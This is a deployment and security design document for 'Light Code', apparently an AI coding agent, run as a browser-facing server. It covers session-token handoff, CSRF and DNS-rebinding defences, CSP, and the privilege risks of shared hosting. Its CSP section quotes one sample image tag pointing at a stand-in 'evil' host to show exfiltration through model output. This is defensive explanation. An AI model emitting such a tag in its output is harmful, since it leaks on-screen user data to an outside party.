# Running Light Code as a server

Two very different deployments share one binary. The first is supported today. The second
is designed for and partly built, but **is not finished, and the gap is not the code — it is
a privilege model.** Read the second half before planning it.

---

## 1. Local, single user

Starts a server on `127.0.0.1` and opens your browser. Same UI as the extension, same
agent, same config format.

**`npx light-code` does not work yet** — the package is not published to npm, so there is
nothing for npx to fetch. From a clone:

```bash
pnpm install
pnpm serve                                # current folder
pnpm serve --workspace D:\src\my-repo
pnpm serve --port 7100 --no-open
```

`pnpm serve` rebuilds the host and starts it.

To get a `light-code` command on PATH without publishing, link it once:

```bash
pnpm --filter light-code link --global
light-code --workspace D:\src\my-repo     # now works from anywhere
```

Once published, all of the above is `npx light-code`. The manifest is already set up for it
— `bin`, `files`, and a shebang on the built entry point — so what is missing is the
decision to publish, which should wait until the browser UI has had real use.

### How the session is protected

Loopback is not a security boundary. Any page you have open can issue requests to
`127.0.0.1`, and while it cannot *read* the reply cross-origin, a request that runs a shell
command has already done its damage on the way in. So:

- **Bound to literal `127.0.0.1`**, never `localhost` — the name resolves differently per
  machine and can dual-stack onto an interface that is not loopback at all.
- **Two-stage token handoff.** The launch URL carries a single-use token in the *fragment*,
  which browsers never send to a server. The page reads it, exchanges it at `/api/session`
  for a session token, and calls `history.replaceState` to strip it from the address bar.
  The handoff expires in 10 seconds and is consumed on first use, valid or not.
- **Bearer header, never a cookie.** Cookies are attached to requests automatically, which
  is the mechanism CSRF depends on.
- **`Origin` and `Host` are both checked on every request.** Origin catches CSRF. Host
  catches DNS rebinding, where the attacker's own domain resolves to 127.0.0.1 so the
  Origin check legitimately passes — the giveaway is a `Host` this server never bound.
- **Strict CSP** with `connect-src 'self'` and `img-src 'self' data:`. Model output renders
  in this page; without those, a reply containing `<img src="https://evil/?d=...">`
  exfiltrates whatever is on screen.
- **No `Access-Control-Allow-Origin`.** Nothing else may read these responses.

Verified against the running server: a forged Origin is refused with 403, a foreign Host
with 421, an absent or wrong token with 401, and a handoff token cannot be redeemed twice.

### Where things are stored

`--data-dir`, defaulting to the OS application-data directory:

```
<data>/users/<hash of principal id>/
    config.json            profiles, MCP servers, approvals   (0600)
    secrets.json           API keys, passwords                (0600)
    workspace-state.json   which task was open
    tasks/                 conversation history
    tool-results/          spilled tool output
    checkpoints/           shadow-git snapshots
```

Everything is already per-principal, which is the groundwork for the next section.

**Secrets are a file, not a keychain, and the UI says so.** The extension gets DPAPI or
Keychain through VS Code's `SecretStorage`. The server has no equivalent without a native
module, so it uses an owner-only file. Encrypting it would be theatre: the key would sit
beside it, readable by the same processes.

---

## 2. Multi-user hosting with SSO — read this first

The identity seam exists. `IdentityProvider` takes a request and returns a `Principal`, and
every store is already keyed by `Principal.id`, so adding OIDC or Windows authentication is
a small, well-bounded piece of work.

**That is not the hard part.** The hard part is this:

> Light Code executes shell commands, reads and writes files, and spawns MCP servers. On a
> hosted deployment, all of that runs as **the account the server process runs as** — not as
> the person who asked for it.

SSO tells you *who is asking*. It does not change *what their request can do*. So on a
shared server, with the design as it stands:

- Every user's commands run with the same OS privileges as every other user's.
- Any user can instruct the agent to read any file the service account can read —
  including another user's `secrets.json` under `<data>/users/`, since file permissions
  separate accounts, and here there is only one account.
- Any user can configure an MCP server, which is an arbitrary executable, and it runs as the
  service account.
- The approval gate protects a user from the *model*. It does not protect users from each
  other, because the person approving is the person asking.

This is consistent with what Light Code has always claimed — §3 of `CLAUDE.md` says plainly
that it does not sandbox executed code and does not protect against another process running
as the same user. On one desktop that is a reasonable line. On a shared server it means
**every user is effectively an administrator of every other user's data.**

### What would actually make it safe

In rough order of how much they buy you:

1. **One OS account per user, or one container per session.** This is the real fix and
   nothing else substitutes for it. The server becomes a supervisor that launches a
   per-user worker under that user's identity; the worker holds the bridge. On Windows this
   is a service that impersonates the authenticated principal, or a container per session.
2. **Workspace confinement per principal**, so a user's tools are rooted in their own tree
   rather than a shared one.
3. **Deny MCP configuration to ordinary users**, or restrict it to an operator-managed
   allowlist. It is arbitrary code execution by design.
4. **Disable the Claude CLI expert and `execute_command` by policy** unless 1 is done.

None of those are built. Until at least (1) is, a hosted deployment is safe only where
**every user is already trusted with everything every other user can reach** — for
instance, one small team sharing a service account they all already have.

### If you deploy it anyway

Because "one team who all trust each other" is a real situation:

- Put it behind IIS or a reverse proxy that terminates authentication, and pass the
  principal through a header the proxy sets and strips from inbound requests.
- Implement `IdentityProvider` against that header. Return the immutable directory
  identifier — an Entra object id or an AD SID — as `Principal.id`, never the username or
  email, both of which get reassigned to a different person when someone leaves.
- Bind the server to loopback and let the proxy be the only thing that reaches it.
- Terminate TLS at the proxy. The `Host` allowlist needs the proxy's public authority added.
- Run the service account with the least privilege that still works, and keep its home
  directory off any share.
- Tell your users plainly that their sessions are not isolated from one another.
